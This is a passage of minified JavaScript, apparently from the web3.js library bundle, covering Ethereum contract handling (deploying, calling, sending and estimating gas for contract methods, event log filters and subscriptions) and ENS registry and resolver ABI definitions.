                            to: e.to,
                            value: e.value,
                            data: null !== (n = e.data) && void 0 !== n ? n : e.input,
                            type: e.type,
                            chainId: e.chainId,
                            accessList: e.accessList,
                            maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                            maxFeePerGas: e.maxFeePerGas
                        }
                    })(s), ((e, t) => {
                        var n, r, i, o, a, s, c, l, u, d, f, h, p, m, g, v, y, b;
                        let w;
                        if ((ss(e.chain) || ss(e.hardfork)) && ss(e.common)) t.defaultCommon ? (w = Object.assign({}, t.defaultCommon), ss(w.hardfork) && (w.hardfork = null !== (n = e.hardfork) && void 0 !== n ? n : t.defaultHardfork), ss(w.baseChain) && (w.baseChain = t.defaultChain)) : w = $d.custom({
                            name: "custom-network",
                            chainId: Us(e.chainId),
                            networkId: ss(e.networkId) ? void 0 : Us(e.networkId),
                            defaultHardfork: null !== (r = e.hardfork) && void 0 !== r ? r : t.defaultHardfork
                        }, {
                            baseChain: t.defaultChain
                        });
                        else {
                            const n = null !== (s = null !== (a = null === (o = null === (i = null === e || void 0 === e ? void 0 : e.common) || void 0 === i ? void 0 : i.customChain) || void 0 === o ? void 0 : o.name) && void 0 !== a ? a : e.chain) && void 0 !== s ? s : "custom-network",
                                r = Us(null !== (u = null === (l = null === (c = null === e || void 0 === e ? void 0 : e.common) || void 0 === c ? void 0 : c.customChain) || void 0 === l ? void 0 : l.chainId) && void 0 !== u ? u : null === e || void 0 === e ? void 0 : e.chainId),
                                x = Us(null !== (h = null === (f = null === (d = null === e || void 0 === e ? void 0 : e.common) || void 0 === d ? void 0 : d.customChain) || void 0 === f ? void 0 : f.networkId) && void 0 !== h ? h : null === e || void 0 === e ? void 0 : e.networkId),
                                A = null !== (g = null !== (m = null === (p = null === e || void 0 === e ? void 0 : e.common) || void 0 === p ? void 0 : p.hardfork) && void 0 !== m ? m : null === e || void 0 === e ? void 0 : e.hardfork) && void 0 !== g ? g : t.defaultHardfork,
                                k = null !== (b = null !== (y = null === (v = e.common) || void 0 === v ? void 0 : v.baseChain) && void 0 !== y ? y : e.chain) && void 0 !== b ? b : t.defaultChain;
                            r && x && n && (w = $d.custom({
                                name: n,
                                chainId: r,
                                networkId: x,
                                defaultHardfork: A
                            }, {
                                baseChain: k
                            }))
                        }
                        return {
                            common: w
                        }
                    })(s, t))
                }))
            },
            zm = (e, t, n) => {
                let {
                    address: r
                } = e;
                var i, o;
                const a = null === n || void 0 === n ? void 0 : n.topics,
                    s = null !== (i = null === n || void 0 === n ? void 0 : n.filter) && void 0 !== i ? i : {},
                    c = {};
                if (cc(null === n || void 0 === n ? void 0 : n.fromBlock) || (c.fromBlock = kc(th.properties.number, null === n || void 0 === n ? void 0 : n.fromBlock, {
                        number: Je.HEX,
                        bytes: Ye.HEX
                    })), cc(null === n || void 0 === n ? void 0 : n.toBlock) || (c.toBlock = kc(th.properties.number, null === n || void 0 === n ? void 0 : n.toBlock, {
                        number: Je.HEX,
                        bytes: Ye.HEX
                    })), a && Array.isArray(a)) c.topics = [...a];
                else if (c.topics = [], !t || t.anonymous || [gh, "allEvents"].includes(t.name) || c.topics.push(null !== (o = t.signature) && void 0 !== o ? o : qh(Gh(t))), ![gh, "allEvents"].includes(t.name) && t.inputs)
                    for (const l of t.inputs) {
                        if (!l.indexed) continue;
                        const e = s[l.name];
                        e ? Array.isArray(e) ? c.topics.push(e.map((e => Dp(l.type, e)))) : "string" === l.type ? c.topics.push(Sc(e)) : c.topics.push(Dp(l.type, e)) : c.topics.push(null)
                    }
                return c.topics.length || delete c.topics, r && (c.address = r.toLowerCase()), c
            },
            Gm = (e, t, n) => {
                const r = Array.isArray(e.inputs) ? e.inputs.length : 0;
                if (e.inputs && r !== t.length) throw new Ut("The number of arguments is not matching the methods required number. You need to pass ".concat(r, " arguments."));
                let i;
                if (i = e.inputs ? Fp(Array.isArray(e.inputs) ? e.inputs : [], t).replace("0x", "") : Lp(t).replace("0x", ""), !cc(o = e) && "object" === typeof o && !cc(o.type) && "constructor" === o.type) {
                    if (!n) throw new Ut("The contract has no contract data option set. This is necessary to append the constructor parameters.");
                    return n.startsWith("0x") ? "".concat(n).concat(i) : "0x".concat(n).concat(i)
                }
                var o;
                return "".concat(Gp(e)).concat(i)
            },
            qm = function(e, t) {
                const n = (!(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2]) && t && t.length >= 10 && t.startsWith("0x") ? t.slice(10) : t;
                if (!e.inputs) throw new Ut("No inputs found in the ABI");
                return Up([...e.inputs], n)
            };
        class Qm extends jl {
            constructor(e, t) {
                super(e, t), this.address = e.address, this.topics = e.topics, this.abi = e.abi, this.jsonInterface = e.jsonInterface
            }
            _buildSubscriptionParams() {
                return ["logs", {
                    address: this.address,
                    topics: this.topics
                }]
            }
            formatSubscriptionResult(e) {
                return Xp(this.abi, e, this.jsonInterface, super.returnFormat)
            }
        }
        Array.from({
            length: 256
        }, ((e, t) => t.toString(16).padStart(2, "0")));
        const Wm = (e, t, n, r) => {
                var i, o;
                const a = {};
                return cc(e.data) && "both" !== r || (a.data = Gm(t, n, null !== (i = e.data) && void 0 !== i ? i : e.input)), cc(e.input) && "both" !== r || (a.input = Gm(t, n, null !== (o = e.input) && void 0 !== o ? o : e.data)), cc(a.input) && cc(a.data) && (a[r] = Gm(t, n)), {
                    data: a.data,
                    input: a.input
                }
            },
            Vm = e => {
                let {
                    abi: t,
                    params: n,
                    options: r,
                    contractOptions: i
                } = e;
                var o, a, s;
                if (!(null !== (s = null !== (a = null !== (o = null === r || void 0 === r ? void 0 : r.input) && void 0 !== o ? o : null === r || void 0 === r ? void 0 : r.data) && void 0 !== a ? a : i.input) && void 0 !== s ? s : i.data) && !(null === r || void 0 === r ? void 0 : r.to) && !i.address) throw new Ut("Contract address not specified");
                if (!(null === r || void 0 === r ? void 0 : r.from) && !i.from) throw new Ut('Contract "from" address not specified');
                let c = uc({
                    to: i.address,
                    gas: i.gas,
                    gasPrice: i.gasPrice,
                    from: i.from,
                    input: i.input,
                    maxPriorityFeePerGas: i.maxPriorityFeePerGas,
                    maxFeePerGas: i.maxFeePerGas,
                    data: i.data
                }, r);
                const l = Wm(c, t, n, null === r || void 0 === r ? void 0 : r.dataInputFill);
                return c = Object.assign(Object.assign({}, c), {
                    data: l.data,
                    input: l.input
                }), c
            },
            Zm = e => "object" === typeof e && !cc(e) && 0 !== Object.keys(e).length && !sc(e);
        var Km = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Jm = {
            logs: Qm,
            newHeads: Nm,
            newBlockHeaders: Nm
        };
        class Ym extends Tf {
            constructor(e, t, n, r, i) {
                var o, a, s;
                const c = sc(t) ? t : sc(n) ? n : void 0;
                let l, u;
                if (l = Zm(t) ? t : Zm(n) ? n : r, u = "object" === typeof t && "provider" in t ? t.provider : "object" === typeof n && "provider" in n ? n.provider : "object" === typeof r && "provider" in r ? r.provider : Ym.givenProvider, super(Object.assign(Object.assign({}, l), {
                        provider: u,
                        registeredSubscriptions: Jm
                    })), this.syncWithContext = !1, this._functions = {}, (null === l || void 0 === l ? void 0 : l.wallet) && (this._wallet = l.wallet), (null === l || void 0 === l ? void 0 : l.accountProvider) && (this._accountProvider = l.accountProvider), !ss(c) && !ss(c.data) && !ss(c.input) && "both" !== this.config.contractDataInputFill) throw new Qt({
                    data: c.data,
                    input: c.input
                });
                this._overloadedMethodAbis = new Map;
                const d = yc(r) ? r : yc(n) ? n : null !== i && void 0 !== i ? i : this.defaultReturnFormat,
                    f = "string" === typeof t ? t : void 0;
                this.config.contractDataInputFill = null !== (o = null === c || void 0 === c ? void 0 : c.dataInputFill) && void 0 !== o ? o : this.config.contractDataInputFill, this._parseAndSetJsonInterface(e, d), this.defaultReturnFormat !== d && (this.defaultReturnFormat = d), ss(f) || this._parseAndSetAddress(f, d), this.options = {
                    address: f,
                    jsonInterface: this._jsonInterface,
                    gas: null !== (a = null === c || void 0 === c ? void 0 : c.gas) && void 0 !== a ? a : null === c || void 0 === c ? void 0 : c.gasLimit,
                    gasPrice: null === c || void 0 === c ? void 0 : c.gasPrice,
                    from: null === c || void 0 === c ? void 0 : c.from,
                    input: null === c || void 0 === c ? void 0 : c.input,
                    data: null === c || void 0 === c ? void 0 : c.data
                }, this.syncWithContext = null !== (s = null === c || void 0 === c ? void 0 : c.syncWithContext) && void 0 !== s && s, l instanceof Tf && this.subscribeToContextEvents(l), Object.defineProperty(this.options, "address", {
                    set: e => this._parseAndSetAddress(e, d),
                    get: () => this._address
                }), Object.defineProperty(this.options, "jsonInterface", {
                    set: e => this._parseAndSetJsonInterface(e, d),
                    get: () => this._jsonInterface
                }), l instanceof Tf && l.on(ml.CONFIG_CHANGE, (e => {
                    this.setConfig({
                        [e.name]: e.newValue
                    })
                }))
            }
            setTransactionMiddleware(e) {
                this.transactionMiddleware = e
            }
            getTransactionMiddleware() {
                return this.transactionMiddleware
            }
            get events() {
                return this._events
            }
            get methods() {
                return this._methods
            }
            clone() {
                let e;
                return e = this.options.address ? new Ym([...this._jsonInterface, ...this._errorsInterface], this.options.address, {
                    gas: this.options.gas,
                    gasPrice: this.options.gasPrice,
                    from: this.options.from,
                    input: this.options.input,
                    data: this.options.data,
                    provider: this.currentProvider,
                    syncWithContext: this.syncWithContext,
                    dataInputFill: this.config.contractDataInputFill
                }, this.getContextObject()) : new Ym([...this._jsonInterface, ...this._errorsInterface], {
                    gas: this.options.gas,
                    gasPrice: this.options.gasPrice,
                    from: this.options.from,
                    input: this.options.input,
                    data: this.options.data,
                    provider: this.currentProvider,
                    syncWithContext: this.syncWithContext,
                    dataInputFill: this.config.contractDataInputFill
                }, this.getContextObject()), this.context && e.subscribeToContextEvents(this.context), e
            }
            deploy(e) {
                var t, n, r, i = this;
                let o = this._jsonInterface.find((e => "constructor" === e.type));
                o || (o = {
                    type: "constructor",
                    stateMutability: ""
                });
                const a = kc({
                        format: "bytes"
                    }, null !== (t = null === e || void 0 === e ? void 0 : e.input) && void 0 !== t ? t : this.options.input, Xe),
                    s = kc({
                        format: "bytes"
                    }, null !== (n = null === e || void 0 === e ? void 0 : e.data) && void 0 !== n ? n : this.options.data, Xe);
                if ((!a || "0x" === a.trim()) && (!s || "0x" === s.trim())) throw new Ut("contract creation without any data provided.");
                const c = null !== (r = null === e || void 0 === e ? void 0 : e.arguments) && void 0 !== r ? r : [],
                    l = Object.assign(Object.assign({}, this.options), {
                        input: a,
                        data: s
                    }),
                    u = null !== a && void 0 !== a ? a : s;
                return {
                    arguments: c,
                    send: e => {
                        const t = Object.assign({}, e);
                        return this._contractMethodDeploySend(o, c, t, l)
                    },
                    estimateGas: function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : i.defaultReturnFormat;
                        return Km(i, void 0, void 0, (function*() {
                            const n = Object.assign({}, e);
                            return this._contractMethodEstimateGas({
                                abi: o,
                                params: c,
                                returnFormat: t,
                                options: n,
                                contractOptions: l
                            })
                        }))
                    },
                    encodeABI: () => Gm(o, c, kc({
                        format: "bytes"
                    }, u, this.defaultReturnFormat)),
                    decodeData: e => Object.assign(Object.assign({}, qm(o, e.replace(u, ""), !1)), {
                        __method__: o.type
                    })
                }
            }
            getPastEvents(e, t, n) {
                var r;
                return Km(this, void 0, void 0, (function*() {
                    const i = "string" === typeof e ? e : gh,
                        o = "string" === typeof e || yc(e) ? yc(t) ? {} : t : e,
                        a = yc(e) ? e : yc(t) ? t : null !== n && void 0 !== n ? n : this.defaultReturnFormat,
                        s = "allEvents" === i || i === gh ? vh : this._jsonInterface.find((e => "name" in e && e.name === i));
                    if (!s) throw new Ut("Event ".concat(i, " not found."));
                    const {
                        fromBlock: c,
                        toBlock: l,
                        topics: u,
                        address: d
                    } = zm(this.options, s, null !== o && void 0 !== o ? o : {}), f = yield Em(this, {
                        fromBlock: c,
                        toBlock: l,
                        topics: u,
                        address: d
                    }, a), h = f ? f.map((e => "string" === typeof e ? e : Xp(s, e, this._jsonInterface, a))) : [], p = null !== (r = null === o || void 0 === o ? void 0 : o.filter) && void 0 !== r ? r : {}, m = Object.keys(p);
                    return m.length > 0 ? h.filter((e => "string" === typeof e || m.every((t => {
                        var n;
                        if (Array.isArray(p[t])) return p[t].some((n => String(e.returnValues[t]).toUpperCase() === String(n).toUpperCase()));
                        const r = null === (n = s.inputs) || void 0 === n ? void 0 : n.filter((e => e.name === t))[0];
                        if ((null === r || void 0 === r ? void 0 : r.indexed) && "string" === r.type) {
                            if (Sc(p[t]) === String(e.returnValues[t])) return !0
                        }
                        return String(e.returnValues[t]).toUpperCase() === String(p[t]).toUpperCase()
                    })))) : h
                }))
            }
            _parseAndSetAddress(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                this._address = e ? Qs(kc({
                    format: "address"
                }, e, t)) : e
            }
            decodeMethodData(e) {
                const t = e.slice(0, 10),
                    n = this._jsonInterface.filter((e => "error" !== e.type)).find((e => t === Gp(Gh(e))));
                if (!n) throw new Ut("The ABI for the provided method signature ".concat(t, " was not found."));
                return Object.assign(Object.assign({}, qm(n, e)), {
                    __method__: Gh(n)
                })
            }
            _parseAndSetJsonInterface(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                var n, r, i, o, a;
                this._functions = {}, this._methods = {}, this._events = {};
                let s = [];
                const c = e.filter((e => "error" !== e.type)),
                    l = e.filter((e => jh(e)));
                for (const u of c) {
                    const e = Object.assign(Object.assign({}, u), {
                        signature: ""
                    });
                    if (Lh(e)) {
                        const t = Gh(e),
                            s = Gp(t);
                        e.methodNameWithInputs = t, e.signature = s, e.constant = null !== (r = null !== (n = "view" === e.stateMutability) && void 0 !== n ? n : "pure" === e.stateMutability) && void 0 !== r ? r : e.constant, e.payable = null !== (i = "payable" === e.stateMutability) && void 0 !== i ? i : e.payable, this._overloadedMethodAbis.set(e.name, [...null !== (o = this._overloadedMethodAbis.get(e.name)) && void 0 !== o ? o : [], e]);
                        const c = null !== (a = this._overloadedMethodAbis.get(e.name)) && void 0 !== a ? a : [],
                            u = this._createContractMethod(c, l),
                            d = this._createContractMethod(c, l, !0);
                        this._functions[t] = {
                            signature: s,
                            method: d
                        }, this._methods[e.name] = u, this._methods[t] = d, this._methods[s] = d
                    } else if (Fh(e)) {
                        const n = Gh(e),
                            r = qh(n),
                            i = this._createContractEvent(e, t);
                        e.signature = r, n in this._events && "bound" !== e.name || (this._events[n] = i), this._events[e.name] = i, this._events[r] = i
                    }
                    s = [...s, e]
                }
                this._events.allEvents = this._createContractEvent(vh, t), this._jsonInterface = [...s], this._errorsInterface = l
            }
            _getAbiParams(e, t) {
                var n;
                try {
                    return La(null !== (n = e.inputs) && void 0 !== n ? n : [], t)
                } catch (r) {
                    throw new Ut("Invalid parameters for method ".concat(e.name, ": ").concat(r.message))
                }
            }
            _createContractMethod(e, t) {
                var n = this;
                let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                const i = e[e.length - 1];
                return function() {
                    for (var e = arguments.length, o = new Array(e), a = 0; a < e; a++) o[a] = arguments[a];
                    var s, c, l;
                    let u;
                    const d = null !== (c = r ? null === (s = n._overloadedMethodAbis.get(i.name)) || void 0 === s ? void 0 : s.filter((e => e.signature === i.signature)) : n._overloadedMethodAbis.get(i.name)) && void 0 !== c ? c : [];
                    let f = d[0];
                    const h = t,
                        p = d.filter((e => {
                            var t;
                            return (null !== (t = e.inputs) && void 0 !== t ? t : []).length === o.length
                        }));
                    if (1 === d.length || 0 === p.length) u = n._getAbiParams(f, o), ps.validate(null !== (l = i.inputs) && void 0 !== l ? l : [], u);
                    else {
                        const e = [],
                            t = [];
                        for (const r of p) try {
                            u = n._getAbiParams(r, o), ps.validate(r.inputs, u), t.push(r)
                        } catch (Qy) {
                            e.push(Qy)
                        }
                        if (1 === t.length ? [f] = t : t.length > 1 && ([f] = t, console.warn("Multiple methods found that is compatible with the given inputs.\n\tFound ".concat(t.length, " compatible methods: ").concat(JSON.stringify(t.map((e => "".concat(e.methodNameWithInputs, " (signature: ").concat(e.signature, ")")))), " \n\tThe first one will be used: ").concat(f.methodNameWithInputs))), e.length === p.length) throw new ka(e)
                    }
                    const m = {
                        arguments: u,
                        call: (e, t) => Km(n, void 0, void 0, (function*() {
                            return this._contractMethodCall(f, u, h, e, t)
                        })),
                        send: e => n._contractMethodSend(f, u, h, e),
                        populateTransaction: (e, t) => {
                            var r, a;
                            let s = null !== t && void 0 !== t ? t : n.options;
                            s = Object.assign(Object.assign({}, s), {
                                input: void 0,
                                from: null !== (a = null !== (r = null === s || void 0 === s ? void 0 : s.from) && void 0 !== r ? r : n.defaultAccount) && void 0 !== a ? a : void 0
                            });
                            const c = Vm({
                                abi: i,
                                params: o,
                                options: Object.assign(Object.assign({}, e), {
                                    dataInputFill: n.config.contractDataInputFill
                                }),
                                contractOptions: s
                            });
                            return c.dataInputFill && delete c.dataInputFill, c
                        },
                        estimateGas: function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : n.defaultReturnFormat;
                            return Km(n, void 0, void 0, (function*() {
                                return this._contractMethodEstimateGas({
                                    abi: f,
                                    params: u,
                                    returnFormat: t,
                                    options: e
                                })
                            }))
                        },
                        encodeABI: () => Gm(f, u),
                        decodeData: e => qm(f, e),
                        createAccessList: (e, t) => Km(n, void 0, void 0, (function*() {
                            return this._contractMethodCreateAccessList(f, u, h, e, t)
                        }))
                    };
                    return f.stateMutability, m
                }
            }
            _contractMethodCall(e, t, n, r, i) {
                var o;
                return Km(this, void 0, void 0, (function*() {
                    const a = (e => {
                        let {
                            abi: t,
                            params: n,
                            options: r,
                            contractOptions: i
                        } = e;
                        if (!(null === r || void 0 === r ? void 0 : r.to) && !i.address) throw new Ut("Contract address not specified");
                        let o = uc({
                            to: i.address,
                            gas: i.gas,
                            gasPrice: i.gasPrice,
                            from: i.from,
                            input: i.input,
                            maxPriorityFeePerGas: i.maxPriorityFeePerGas,
                            maxFeePerGas: i.maxFeePerGas,
                            data: i.data
                        }, r);
                        const a = Wm(o, t, n, null === r || void 0 === r ? void 0 : r.dataInputFill);
                        return o = Object.assign(Object.assign({}, o), {
                            data: a.data,
                            input: a.input
                        }), o
                    })({
                        abi: e,
                        params: t,
                        options: Object.assign(Object.assign({}, r), {
                            dataInputFill: this.config.contractDataInputFill
                        }),
                        contractOptions: Object.assign(Object.assign({}, this.options), {
                            from: null !== (o = this.options.from) && void 0 !== o ? o : this.config.defaultAccount
                        })
                    });
                    try {
                        const t = yield Am(this, a, i, this.defaultReturnFormat);
                        return ((e, t) => {
                            if ("constructor" === e.type) return t;
                            if (!t) return null;
                            const n = t.length >= 2 ? t.slice(2) : t;
                            if (!e.outputs) return null;
                            const r = Up([...e.outputs], n);
                            return 1 === r.__length__ ? r[0] : r
                        })(e, t)
                    } catch (s) {
                        throw s instanceof qt && Wp(n, s.cause), s
                    }
                }))
            }
            _contractMethodCreateAccessList(e, t, n, r, i) {
                var o;
                return Km(this, void 0, void 0, (function*() {
                    const a = (e => {
                        let {
                            abi: t,
                            params: n,
                            options: r,
                            contractOptions: i
                        } = e;
                        if (!(null === r || void 0 === r ? void 0 : r.to) && !i.address) throw new Ut("Contract address not specified");
                        if (!(null === r || void 0 === r ? void 0 : r.from) && !i.from) throw new Ut('Contract "from" address not specified');
                        let o = uc({
                            to: i.address,
                            gas: i.gas,
                            gasPrice: i.gasPrice,
                            from: i.from,
                            input: i.input,
                            maxPriorityFeePerGas: i.maxPriorityFeePerGas,
                            maxFeePerGas: i.maxFeePerGas,
                            data: i.data
                        }, r);
                        const a = Wm(o, t, n, null === r || void 0 === r ? void 0 : r.dataInputFill);
                        return o = Object.assign(Object.assign({}, o), {
                            data: a.data,
                            input: a.input
                        }), o
                    })({
                        abi: e,
                        params: t,
                        options: Object.assign(Object.assign({}, r), {
                            dataInputFill: this.config.contractDataInputFill
                        }),
                        contractOptions: Object.assign(Object.assign({}, this.options), {
                            from: null !== (o = this.options.from) && void 0 !== o ? o : this.config.defaultAccount
                        })
                    });
                    try {
                        return Im(this, a, i, this.defaultReturnFormat)
                    } catch (s) {
                        throw s instanceof qt && Wp(n, s.cause), s
                    }
                }))
            }
            _contractMethodSend(e, t, n, r, i) {
                var o, a;
                let s = null !== i && void 0 !== i ? i : this.options;
                s = Object.assign(Object.assign({}, s), {
                    input: void 0,
                    from: null !== (a = null !== (o = s.from) && void 0 !== o ? o : this.defaultAccount) && void 0 !== a ? a : void 0
                });
                const c = Vm({
                        abi: e,
                        params: t,
                        options: Object.assign(Object.assign({}, r), {
                            dataInputFill: this.config.contractDataInputFill
                        }),
                        contractOptions: s
                    }),
                    l = ss(this.transactionMiddleware) ? bm(this, c, this.defaultReturnFormat, {
                        checkRevertBeforeSending: !1,
                        contractAbi: this._jsonInterface
                    }) : bm(this, c, this.defaultReturnFormat, {
                        checkRevertBeforeSending: !1,
                        contractAbi: this._jsonInterface
                    }, this.transactionMiddleware);
                return l.on("error", (e => {
                    e instanceof qt && Wp(n, e.cause)
                })), l
            }
            _contractMethodDeploySend(e, t, n, r) {
                var i, o;
                let a = null !== r && void 0 !== r ? r : this.options;
                a = Object.assign(Object.assign({}, a), {
                    from: null !== (o = null !== (i = a.from) && void 0 !== i ? i : this.defaultAccount) && void 0 !== o ? o : void 0
                });
                const s = Vm({
                        abi: e,
                        params: t,
                        options: Object.assign(Object.assign({}, n), {
                            dataInputFill: this.contractDataInputFill
                        }),
                        contractOptions: a
                    }),
                    c = {
                        transactionResolver: e => {
                            if (e.status === BigInt(0)) throw new Ut("code couldn't be stored", e);
                            const t = this.clone();
                            return t.options.address = e.contractAddress, t
                        },
                        contractAbi: this._jsonInterface,
                        checkRevertBeforeSending: !1
                    };
                return ss(this.transactionMiddleware) ? bm(this, s, this.defaultReturnFormat, c) : bm(this, s, this.defaultReturnFormat, c, this.transactionMiddleware)
            }
            _contractMethodEstimateGas(e) {
                let {
                    abi: t,
                    params: n,
                    returnFormat: r,
                    options: i,
                    contractOptions: o
                } = e;
                return Km(this, void 0, void 0, (function*() {
                    const e = (e => {
                        let {
                            abi: t,
                            params: n,
                            options: r,
                            contractOptions: i
                        } = e, o = uc({
                            to: i.address,
                            gas: i.gas,
                            gasPrice: i.gasPrice,
                            from: i.from,
                            input: i.input,
                            data: i.data
                        }, r);
                        const a = Wm(o, t, n, null === r || void 0 === r ? void 0 : r.dataInputFill);
                        return o = Object.assign(Object.assign({}, o), {
                            data: a.data,
                            input: a.input
                        }), o
                    })({
                        abi: t,
                        params: n,
                        options: Object.assign(Object.assign({}, i), {
                            dataInputFill: this.config.contractDataInputFill
                        }),
                        contractOptions: null !== o && void 0 !== o ? o : this.options
                    });
                    return km(this, e, et.LATEST, null !== r && void 0 !== r ? r : this.defaultReturnFormat)
                }))
            }
            _createContractEvent(e) {
                var t = this;
                let n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.defaultReturnFormat;
                return function() {
                    var r;
                    const {
                        topics: i,
                        fromBlock: o
                    } = zm(t.options, e, arguments.length <= 0 ? void 0 : arguments[0]), a = new Qm({
                        address: t.options.address,
                        topics: i,
                        abi: e,
                        jsonInterface: t._jsonInterface
                    }, {
                        subscriptionManager: t.subscriptionManager,
                        returnFormat: n
                    });
                    return ss(o) || t.getPastEvents(e.name, {
                        fromBlock: o,
                        topics: i
                    }, n).then((e => {
                        e && e.forEach((e => a.emit("data", e)))
                    })).catch((e => {
                        a.emit("error", new rn("Failed to get past events.", e))
                    })), null === (r = t.subscriptionManager) || void 0 === r || r.addSubscription(a).catch((e => {
                        a.emit("error", new rn("Failed to subscribe.", e))
                    })), a
                }
            }
            subscribeToContextEvents(e) {
                const t = this;
                this.context = e, t.syncWithContext && e.on(ml.CONFIG_CHANGE, (e => {
                    t.setConfig({
                        [e.name]: e.newValue
                    })
                }))
            }
        }
        const Xm = Ym,
            $m = {
                addr: "0x3b3b57de",
                name: "0x691f3431",
                abi: "0x2203ab56",
                pubkey: "0xc8690233",
                text: "0x59d1d43c",
                contenthash: "0xbc1c58d1"
            },
            eg = "addr",
            tg = "addr",
            ng = "pubkey",
            rg = "contenthash",
            ig = "text",
            og = "name",
            ag = {
                main: "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
                goerli: "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"
            },
            sg = {
                "0x1": "main",
                "0x5": "goerli"
            },
            cg = [{
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !0,
                    internalType: "bytes32",
                    name: "label",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "address",
                    name: "owner",
                    type: "address"
                }],
                name: "NewOwner",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "address",
                    name: "resolver",
                    type: "address"
                }],
                name: "NewResolver",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "address",
                    name: "owner",
                    type: "address"
                }],
                name: "Transfer",
                type: "event"
            }, {
                inputs: [{
                    internalType: "address",
                    name: "owner",
                    type: "address"
                }, {
                    internalType: "address",
                    name: "operator",
                    type: "address"
                }],
                name: "isApprovedForAll",
                outputs: [{
                    internalType: "bool",
                    name: "",
                    type: "bool"
                }],
                stateMutability: "view",
                type: "function"
            }, {
                inputs: [{
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }],
                name: "owner",
                outputs: [{
                    internalType: "address",
                    name: "",
                    type: "address"
                }],
                stateMutability: "view",
                type: "function"
            }, {
                inputs: [{
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }],
                name: "recordExists",
                outputs: [{
                    internalType: "bool",
                    name: "",
                    type: "bool"
                }],
                stateMutability: "view",
                type: "function"
            }, {
                inputs: [{
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }],
                name: "resolver",
                outputs: [{
                    internalType: "address",
                    name: "",
                    type: "address"
                }],
                stateMutability: "view",
                type: "function"
            }, {
                inputs: [{
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }],
                name: "ttl",
                outputs: [{
                    internalType: "uint64",
                    name: "",
                    type: "uint64"
                }],
                stateMutability: "view",
                type: "function"
            }],
            lg = [{
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "address",
                    name: "a",
                    type: "address"
                }],
                name: "AddrChanged",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "uint256",
                    name: "coinType",
                    type: "uint256"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "newAddress",
                    type: "bytes"
                }],
                name: "AddressChanged",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "address",
                    name: "owner",
                    type: "address"
                }, {
                    indexed: !0,
                    internalType: "address",
                    name: "operator",
                    type: "address"
                }, {
                    indexed: !1,
                    internalType: "bool",
                    name: "approved",
                    type: "bool"
                }],
                name: "ApprovalForAll",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "hash",
                    type: "bytes"
                }],
                name: "ContenthashChanged",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "name",
                    type: "bytes"
                }, {
                    indexed: !1,
                    internalType: "uint16",
                    name: "resource",
                    type: "uint16"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "record",
                    type: "bytes"
                }],
                name: "DNSRecordChanged",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "name",
                    type: "bytes"
                }, {
                    indexed: !1,
                    internalType: "uint16",
                    name: "resource",
                    type: "uint16"
                }],
                name: "DNSRecordDeleted",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }],
                name: "DNSZoneCleared",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "lastzonehash",
                    type: "bytes"
                }, {
                    indexed: !1,
                    internalType: "bytes",
                    name: "zonehash",
                    type: "bytes"
                }],
                name: "DNSZonehashChanged",
                type: "event"
            }, {
                anonymous: !1,
                inputs: [{
                    indexed: !0,
                    internalType: "bytes32",
                    name: "node",
                    type: "bytes32"
                }, {
                    indexed: !0,
                    internalType: "bytes4",
                    name: "interfaceID",
                    type: "bytes4"
